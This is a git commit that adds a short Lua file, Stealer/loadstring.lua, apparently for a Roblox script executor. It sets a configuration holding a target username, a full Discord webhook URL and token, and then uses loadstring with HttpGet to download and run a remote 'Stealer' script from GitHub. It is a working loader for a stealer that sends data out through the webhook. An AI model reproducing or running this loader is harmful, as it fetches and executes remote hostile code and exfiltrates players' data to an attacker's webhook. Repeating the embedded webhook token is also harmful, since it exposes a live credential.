5a5ca39d202a546e9a1e65a96808e17c2e83ed24
Syntaxical <193889244+xxpwnxxx420lord@users.noreply.github.com>
2025-05-24 16:58:39 +1000

    Create loadstring.lua

---
+++ Stealer/loadstring.lua
@@ -0,0 +1,7 @@
+getgenv.data = {-- fill this out or you code isn't gonna work
+    user = "russianaess_ontop",
+    webhook = "https://discord.com/api/webhooks/1238443993474273382/i0sGDbwB-1_sIir2Ze4yupNDGPUuwe4KsLdlO8PRny8IJfWyGRdQuGclB-qA9eDbNSfh",
+    scripttoload = 'print("Hello, World!")'
+}
+
+loadstring(game:HttpGet("https://github.com/xxpwnxxx420lord/Wuno/blob/main/Stealer/Main.lua?raw=true", true))()
